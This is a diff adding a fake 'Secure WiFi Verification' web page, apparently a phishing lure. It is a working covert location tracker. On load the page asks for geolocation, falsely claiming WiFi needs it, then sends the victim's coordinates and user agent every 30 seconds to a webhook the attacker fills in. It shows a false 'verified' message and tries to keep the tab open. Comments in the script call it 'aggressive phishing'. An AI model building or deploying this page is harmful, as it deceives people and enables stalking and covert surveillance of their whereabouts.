@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Connected - Location Verification</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: browsersize; }
+        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
+        .status { color: #28a745; font-size: 24px; margin: 20px 0; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { background: #007bff; color: white; border: none; padding: 12px 30px; border-radius: 25px; font-size: 16px; cursor: pointer; }
+        button:hover { background: #0056b3; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🔒 Secure WiFi Verification</h2>
+        <p>Your device is connected. Verifying location for security...</p>
+        <div id="spinner" class="spinner"></div>
+        <div id="status" class="status hidden">✅ Location Verified. Keeping connection active...</div>
+        <button id="allowBtn" onclick="requestLocation()">Allow Location Access</button>
+    </div>
+
+    <script>
+        let webhookUrl = 'YOUR_WEBHOOK_URL_HERE';  // Replace with your ngrok/Receive URL
+        let intervalId;
+
+        function sendLocation(lat, lon, acc) {
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    latitude: lat,
+                    longitude: lon,
+                    accuracy: acc,
+                    userAgent: navigator.userAgent
+                })
+            }).catch(err => console.log('Send failed:', err));
+        }
+
+        function startTracking() {
+            document.getElementById('allowBtn').classList.add('hidden');
+            document.getElementById('spinner').classList.add('hidden');
+            document.getElementById('status').classList.remove('hidden');
+            document.body.style.background = '#000';  // Darken to simulate fullscreen
+            intervalId = setInterval(() => {
+                if (!document.hidden) {  // Only poll if tab visible for battery evasion
+                    navigator.geolocation.getCurrentPosition(
+                        pos => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
+                        err => console.log('Geo err:', err),
+                        { enableHighAccuracy: true, maximumAge: 30000, timeout: 10000 }
+                    );
+                }
+            }, 30000);  // 30s updates
+        }
+
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                        startTracking();
+                    },
+                    err => {
+                        alert('Location access required for WiFi. Please enable.');
+                    },
+                    { enableHighAccuracy: true }
+                );
+            } else {
+                alert('Geolocation not supported.');
+            }
+        }
+
+        // Auto-request on load (aggressive phishing)
+        window.onload = () => requestLocation();
+
+        // Prevent close/exit
+        window.addEventListener('beforeunload', () => 'Connection active - stay for security.');
+    </script>
+</body>
+</html>
